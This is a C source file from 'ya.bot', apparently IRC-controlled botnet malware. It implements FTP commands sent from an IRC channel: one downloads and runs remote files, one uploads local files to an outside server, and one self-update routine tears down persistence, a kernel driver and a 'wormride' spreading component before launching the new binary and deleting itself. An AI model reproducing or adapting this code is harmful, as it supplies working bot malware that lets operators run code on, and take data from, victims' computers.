/*  ya.bot  */

#include "bot.h"

#ifndef NO_FTP
DWORD WINAPI ftp_download(LPVOID param)
{
	HINTERNET hInternet, hSession;
	SFTPDownload s_fd = *((SFTPDownload *)param);

#ifndef NO_DEBUG
		debug_print("[DEBUG] Downloading file, ftp_download()");
#endif

	if ((!s_fd.m_bSilent) && (s_fd.m_bVerbose))
			irc_message(s_fd.m_bsock, s_fd.m_szAction, s_fd.m_szDestination,
					(char *)string_ftpretr,
					CBLUE, string_replyftp, CEND, string_replydotbot,
					CBLUE, CEND, s_fd.m_szRemoteFilePath);
		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet)
	{
			hSession = InternetConnect(hInternet,
					s_fd.m_szHost,
					s_fd.m_nPort,
					s_fd.m_szUserName,
					s_fd.m_szPassword,
					INTERNET_SERVICE_FTP,
					INTERNET_FLAG_PASSIVE,
					0);
		if (hSession)
		{
			if (FtpGetFile(hSession,
						s_fd.m_szRemoteFilePath,
						s_fd.m_szLocalFilePath,
						TRUE,
						FILE_ATTRIBUTE_NORMAL,
						FTP_TRANSFER_TYPE_UNKNOWN,
						0))
			{
				if (s_fd.m_bRun)
						file_open(s_fd.m_szLocalFilePath);
					InternetCloseHandle(hSession);
					InternetCloseHandle(hInternet);
				if (!s_fd.m_bSilent)
						irc_message(s_fd.m_bsock, s_fd.m_szAction, s_fd.m_szDestination,
								(char *)string_ftpretrievedfile,
								CGREEN, string_replyftp, CEND, string_replydotbot,
								CBLUE, CEND, s_fd.m_szLocalFilePath,
								CBLUE, CEND, s_fd.m_szRemoteFilePath,
								CBLUE, CEND, s_fd.m_bRun);
					thread_remove(THREAD_FTP);
					return 0;
			}
		}
	}
		InternetCloseHandle(hSession);
		InternetCloseHandle(hInternet);
	if ((!s_fd.m_bSilent) && (s_fd.m_bVerbose))
			irc_message(s_fd.m_bsock, s_fd.m_szAction, s_fd.m_szDestination,
					(char *)string_ftpunabletoretrieve,
					CRED, string_replyftp, CEND, string_replydotbot,
					CBLUE, CEND, s_fd.m_szRemoteFilePath);
		thread_remove(THREAD_FTP);
		return 0;
}

DWORD WINAPI ftp_update(LPVOID param)
{
	char szFilePath[MAX_PATH], szTempDir[MAX_PATH];
	HINTERNET hInternet, hSession;
	SFTPDownload s_fd = *((SFTPDownload*)param);

#ifndef NO_DEBUG
		debug_print("[DEBUG] Updating file, ftp_update()");
#endif

	if ((!s_fd.m_bSilent) && (s_fd.m_bVerbose))
			irc_message(s_fd.m_bsock, s_fd.m_szAction, s_fd.m_szDestination,
					(char *)string_ftpretr,
					CBLUE, string_replyftp, CEND, string_replydotbot,
					CBLUE, CEND, s_fd.m_szRemoteFilePath);
		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet)
	{
			hSession = InternetConnect(hInternet,
					s_fd.m_szHost,
					s_fd.m_nPort,
					s_fd.m_szUserName,
					s_fd.m_szPassword,
					INTERNET_SERVICE_FTP,
					INTERNET_FLAG_PASSIVE,
					0);
		if (hSession)
		{
				srand(GetTickCount());
				GetTempPath(sizeof(szTempDir) - 1, szTempDir);
				_snprintf(szFilePath, sizeof(szFilePath) - 1,
						(char *)string_ftpupdatefile,
						szTempDir,
						rand() % 9999);
			if (FtpGetFile(hSession,
						s_fd.m_szRemoteFilePath,
						szFilePath,
						TRUE,
						FILE_ATTRIBUTE_NORMAL,
						FTP_TRANSFER_TYPE_UNKNOWN,
						0))
			{
					InternetCloseHandle(hSession);
					InternetCloseHandle(hInternet);
				if (!s_fd.m_bSilent)
						irc_message(s_fd.m_bsock, s_fd.m_szAction, s_fd.m_szDestination,
								(char *)string_ftpretrievedupdate,
								CGREEN, string_replyftp, CEND, string_replydotbot,
								CBLUE, CEND, s_fd.m_szLocalFilePath,
								CBLUE, CEND, s_fd.m_szRemoteFilePath);
#ifndef NO_INSTALLBOT
				if (uninstall_bot())
				{

#ifndef NO_PERSIST
						TerminateThread(g_hPersistThread, 0);
						CloseHandle(g_hPersistThread);
#endif

#ifndef NO_INSTALLDRIVER
						uninstall_driver();
#endif

#ifndef NO_INSTALLWORMRIDE
						uninstall_wormride();
#endif

						irc_action(s_fd.m_bsock, (char *)string_ircquit, (char *)string_botquitmsg);
						irc_disconnect(s_fd.m_bsock, s_fd.m_wsaEvent);
						process_start(szFilePath, FALSE);
						uninstall_botmelt();
						ExitProcess(0);
				}
#endif
			}
		}
	}
		InternetCloseHandle(hSession);
		InternetCloseHandle(hInternet);
	if ((!s_fd.m_bSilent) && (s_fd.m_bVerbose))
			irc_message(s_fd.m_bsock, s_fd.m_szAction, s_fd.m_szDestination,
					(char *)string_ftpunabletoretrieve,
					CRED, string_replyftp, CEND, string_replydotbot,
					CBLUE, CEND, s_fd.m_szRemoteFilePath);
		thread_remove(THREAD_FTP);
		return 0;
}

DWORD WINAPI ftp_upload(LPVOID param)
{
	HINTERNET hInternet, hSession;
	SFTPUpload s_fu = *((SFTPUpload *)param);

#ifndef NO_DEBUG
		debug_print("[DEBUG] Uploading file, ftp_download()");
#endif

	if ((!s_fu.m_bSilent) && (s_fu.m_bVerbose))
			irc_message(s_fu.m_bsock, s_fu.m_szAction, s_fu.m_szDestination,
					(char *)string_ftpstor,
					CBLUE, string_replyftp, CEND, string_replydotbot,
					CBLUE, CEND, s_fu.m_szLocalFilePath);
		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet)
	{
			hSession = InternetConnect(hInternet,
					s_fu.m_szHost,
					s_fu.m_nPort,
					s_fu.m_szUserName,
					s_fu.m_szPassword,
					INTERNET_SERVICE_FTP,
					INTERNET_FLAG_PASSIVE,
					0);
		if (hSession)
		{
			if (FtpPutFile(hSession,
						s_fu.m_szLocalFilePath,
						s_fu.m_szRemoteFilePath,
						FTP_TRANSFER_TYPE_UNKNOWN,
						0))
			{
					InternetCloseHandle(hSession);
					InternetCloseHandle(hInternet);
				if (!s_fu.m_bSilent)
						irc_message(s_fu.m_bsock, s_fu.m_szAction, s_fu.m_szDestination,
								(char *)string_ftpstoredfile,
								CGREEN, string_replyftp, CEND, string_replydotbot,
								CBLUE, CEND, s_fu.m_szLocalFilePath,
								CBLUE, CEND, s_fu.m_szRemoteFilePath);
					thread_remove(THREAD_FTP);
					return 0;
			}
		}
	}
		InternetCloseHandle(hSession);
		InternetCloseHandle(hInternet);
	if ((!s_fu.m_bSilent) && (s_fu.m_bVerbose))
			irc_message(s_fu.m_bsock, s_fu.m_szAction, s_fu.m_szDestination,
					(char *)string_ftpunabletostore,
					CRED, string_replyftp, CEND, string_replydotbot,
					CBLUE, CEND, s_fu.m_szLocalFilePath);
		thread_remove(THREAD_FTP);
		return 0;
}
#endif